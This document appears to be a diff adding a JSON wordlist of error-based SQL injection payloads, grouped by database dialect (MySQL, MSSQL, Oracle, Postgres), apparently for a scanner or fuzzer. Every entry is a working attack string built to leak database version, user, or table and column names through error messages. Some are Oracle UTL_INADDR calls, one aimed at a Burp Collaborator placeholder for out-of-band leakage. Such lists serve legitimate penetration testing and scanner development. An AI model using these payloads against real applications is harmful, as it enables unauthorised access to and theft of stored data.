@@ -1,0 +1,300 @@
+{
+ "class": "sqli_error",
+ "entries": [
+  {
+   "payload": "'",
+   "dialect": "manual",
+   "source": "manual-curated"
+  },
+  {
+   "payload": "\"",
+   "dialect": "manual",
+   "source": "manual-curated"
+  },
+  {
+   "payload": "')",
+   "dialect": "manual",
+   "source": "manual-curated"
+  },
+  {
+   "payload": "'-- -",
+   "dialect": "manual",
+   "source": "manual-curated"
+  },
+  {
+   "payload": "%27",
+   "dialect": "manual",
+   "source": "manual-curated"
+  },
+  {
+   "payload": "and extractvalue(1,concat(0x7e,(select database()),0x7e))",
+   "dialect": "manual",
+   "source": "manual-curated"
+  },
+  {
+   "payload": "and updatexml(1,concat(0x7e,(select user()),0x7e),1)",
+   "dialect": "manual",
+   "source": "manual-curated"
+  },
+  {
+   "payload": "1\" AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(@@VERSION,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)#",
+   "dialect": "manual",
+   "source": "manual-curated"
+  },
+  {
+   "payload": "'||dbms_xmlgen.getxml('select user from dual')||'",
+   "dialect": "manual",
+   "source": "manual-curated"
+  },
+  {
+   "payload": "' AND 1=UTL_INADDR.GET_HOST_NAME((SELECT banner FROM v$version WHERE ROWNUM=1))-- -",
+   "dialect": "manual",
+   "source": "manual-curated"
+  },
+  {
+   "payload": "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))-- -",
+   "dialect": "mysql",
+   "source": "grammar-expanded"
+  },
+  {
+   "payload": "' AND UPDATEXML(1,CONCAT(0x7e,VERSION(),0x7e),1)-- -",
+   "dialect": "mysql",
+   "source": "grammar-expanded"
+  },
+  {
+   "payload": "' AND EXTRACTVALUE(1,CONCAT(0x7e,DATABASE(),0x7e))-- -",
+   "dialect": "mysql",
+   "source": "grammar-expanded"
+  },
+  {
+   "payload": "' AND UPDATEXML(1,CONCAT(0x7e,DATABASE(),0x7e),1)-- -",
+   "dialect": "mysql",
+   "source": "grammar-expanded"
+  },
+  {
+   "payload": "' AND EXTRACTVALUE(1,CONCAT(0x7e,USER(),0x7e))-- -",
+   "dialect": "mysql",
+   "source": "grammar-expanded"
+  },
+  {
+   "payload": "' AND UPDATEXML(1,CONCAT(0x7e,USER(),0x7e),1)-- -",
+   "dialect": "mysql",
+   "source": "grammar-expanded"
+  },
+  {
+   "payload": "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))#",
+   "dialect": "mysql",
+   "source": "grammar-expanded"
+  },
+  {
+   "payload": "' AND UPDATEXML(1,CONCAT(0x7e,VERSION(),0x7e),1)#",
+   "dialect": "mysql",
+   "source": "grammar-expanded"
+  },
+  {
+   "payload": "' AND EXTRACTVALUE(1,CONCAT(0x7e,DATABASE(),0x7e))#",
+   "dialect": "mysql",
+   "source": "grammar-expanded"
+  },
+  {
+   "payload": "' AND UPDATEXML(1,CONCAT(0x7e,DATABASE(),0x7e),1)#",
+   "dialect": "mysql",
+   "source": "grammar-expanded"
+  },
+  {
+   "payload": "' AND EXTRACTVALUE(1,CONCAT(0x7e,USER(),0x7e))#",
+   "dialect": "mysql",
+   "source": "grammar-expanded"
+  },
+  {
+   "payload": "' AND UPDATEXML(1,CONCAT(0x7e,USER(),0x7e),1)#",
+   "dialect": "mysql",
+   "source": "grammar-expanded"
+  },
+  {
+   "payload": "\" AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))-- -",
+   "dialect": "mysql",
+   "source": "grammar-expanded"
+  },
+  {
+   "payload": "\" AND UPDATEXML(1,CONCAT(0x7e,VERSION(),0x7e),1)-- -",
+   "dialect": "mysql",
+   "source": "grammar-expanded"
+  },
+  {
+   "payload": "\" AND EXTRACTVALUE(1,CONCAT(0x7e,DATABASE(),0x7e))-- -",
+   "dialect": "mysql",
+   "source": "grammar-expanded"
+  },
+  {
+   "payload": "\" AND UPDATEXML(1,CONCAT(0x7e,DATABASE(),0x7e),1)-- -",
+   "dialect": "mysql",
+   "source": "grammar-expanded"
+  },
+  {
+   "payload": "\" AND EXTRACTVALUE(1,CONCAT(0x7e,USER(),0x7e))-- -",
+   "dialect": "mysql",
+   "source": "grammar-expanded"
+  },
+  {
+   "payload": "\" AND UPDATEXML(1,CONCAT(0x7e,USER(),0x7e),1)-- -",
+   "dialect": "mysql",
+   "source": "grammar-expanded"
+  },
+  {
+   "payload": "\" AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))#",
+   "dialect": "mysql",
+   "source": "grammar-expanded"
+  },
+  {
+   "payload": "\" AND UPDATEXML(1,CONCAT(0x7e,VERSION(),0x7e),1)#",
+   "dialect": "mysql",
+   "source": "grammar-expanded"
+  },
+  {
+   "payload": "\" AND EXTRACTVALUE(1,CONCAT(0x7e,DATABASE(),0x7e))#",
+   "dialect": "mysql",
+   "source": "grammar-expanded"
+  },
+  {
+   "payload": "\" AND UPDATEXML(1,CONCAT(0x7e,DATABASE(),0x7e),1)#",
+   "dialect": "mysql",
+   "source": "grammar-expanded"
+  },
+  {
+   "payload": "\" AND EXTRACTVALUE(1,CONCAT(0x7e,USER(),0x7e))#",
+   "dialect": "mysql",
+   "source": "grammar-expanded"
+  },
+  {
+   "payload": "\" AND UPDATEXML(1,CONCAT(0x7e,USER(),0x7e),1)#",
+   "dialect": "mysql",
+   "source": "grammar-expanded"
+  },
+  {
+   "payload": "' AND 1=CAST(@@version AS INT)-- -",
+   "dialect": "mssql",
+   "source": "grammar-expanded"
+  },
+  {
+   "payload": "' AND 1=CONVERT(INT,DB_NAME())-- -",
+   "dialect": "mssql",
+   "source": "grammar-expanded"
+  },
+  {
+   "payload": "' AND 1=CAST(DB_NAME() AS INT)#",
+   "dialect": "mssql",
+   "source": "grammar-expanded"
+  },
+  {
+   "payload": "\" AND 1=CAST(@@version AS INT)-- -",
+   "dialect": "mssql",
+   "source": "grammar-expanded"
+  },
+  {
+   "payload": "\" AND 1=CONVERT(INT,DB_NAME())-- -",
+   "dialect": "mssql",
+   "source": "grammar-expanded"
+  },
+  {
+   "payload": "\" AND 1=CAST(DB_NAME() AS INT)#",
+   "dialect": "mssql",
+   "source": "grammar-expanded"
+  },
+  {
+   "payload": "AND EXTRACTVALUE(1337,CONCAT('.','~',(SELECT version()),'~')) -- -",
+   "dialect": "mysql",
+   "source": "SQL Injection/MySQL Injection.md"
+  },
+  {
+   "payload": "AND 1337=CONVERT(INT,(SELECT '~'+(SELECT @@version)+'~')) -- -",
+   "dialect": "mssql",
+   "source": "SQL Injection/MSSQL Injection.md"
+  },
+  {
+   "payload": "SELECT UTL_INADDR.get_host_name FROM dual",
+   "dialect": "oracle",
+   "source": "SQL Injection/OracleSQL Injection.md"
+  },
+  {
+   "payload": "' and 1=cast((SELECT concat('DATABASE: ',current_database())) as int) and '1'='1",
+   "dialect": "postgres",
+   "source": "SQL Injection/PostgreSQL Injection.md"
+  },
+  {
+   "payload": "SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')",
+   "dialect": "generic",
+   "source": "SQL Injection/README.md"
+  },
+  {
+   "payload": "AND UPDATEXML(1337,CONCAT('.','~',(SELECT version()),'~'),31337) -- -",
+   "dialect": "mysql",
+   "source": "SQL Injection/MySQL Injection.md"
+  },
+  {
+   "payload": "convert(int,@@version)",
+   "dialect": "mssql",
+   "source": "SQL Injection/MSSQL Injection.md"
+  },
+  {
+   "payload": "SELECT UTL_INADDR.get_host_name('10.0.0.1') FROM dual",
+   "dialect": "oracle",
+   "source": "SQL Injection/OracleSQL Injection.md"
+  },
+  {
+   "payload": "' and 1=cast((SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET data_offset) as int) and '1'='1",
+   "dialect": "postgres",
+   "source": "SQL Injection/PostgreSQL Injection.md"
+  },
+  {
+   "payload": "AND EXP(~(SELECT * FROM (SELECT CONCAT('~',(SELECT version()),'~','x'))x)) -- -",
+   "dialect": "mysql",
+   "source": "SQL Injection/MySQL Injection.md"
+  },
+  {
+   "payload": "' + convert(int,@@version) + '",
+   "dialect": "mssql",
+   "source": "SQL Injection/MSSQL Injection.md"
+  },
+  {
+   "payload": "SELECT UTL_INADDR.get_host_address FROM dual",
+   "dialect": "oracle",
+   "source": "SQL Injection/OracleSQL Injection.md"
+  },
+  {
+   "payload": "' and 1=cast((SELECT column_name FROM information_schema.columns WHERE table_name='data_table' LIMIT 1 OFFSET data_offset) as int) and '1'='1",
+   "dialect": "postgres",
+   "source": "SQL Injection/PostgreSQL Injection.md"
+  },
+  {
+   "payload": "OR 1 GROUP BY CONCAT('~',(SELECT version()),'~',FLOOR(RAND(0)*2)) HAVING MIN(0) -- -",
+   "dialect": "mysql",
+   "source": "SQL Injection/MySQL Injection.md"
+  },
+  {
+   "payload": "SELECT utl_inaddr.get_host_name((select banner from v$version where rownum=1)) FROM dual",
+   "dialect": "oracle",
+   "source": "SQL Injection/OracleSQL Injection.md"
+  },
+  {
+   "payload": "AND (SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1)) as x)--",
+   "dialect": "mysql",
+   "source": "SQL Injection/MySQL Injection.md"
+  },
+  {
+   "payload": "SELECT CTXSYS.DRITHSX.SN(user,(select banner from v$version where rownum=1)) FROM dual",
+   "dialect": "oracle",
+   "source": "SQL Injection/OracleSQL Injection.md"
+  },
+  {
+   "payload": "(SELECT 1 AND ROW(1,1)>(SELECT COUNT(*),CONCAT(CONCAT(@@VERSION),0X3A,FLOOR(RAND()*2))X FROM (SELECT 1 UNION SELECT 2)A GROUP BY X LIMIT 1))",
+   "dialect": "mysql",
+   "source": "SQL Injection/MySQL Injection.md"
+  },
+  {
+   "payload": "SELECT to_char(dbms_xmlgen.getxml('select \"'&#124;&#124;(select user from sys.dual)&#124;&#124;'\" FROM sys.dual')) FROM dual",
+   "dialect": "oracle",
+   "source": "SQL Injection/OracleSQL Injection.md"
+  }
+ ]
+}
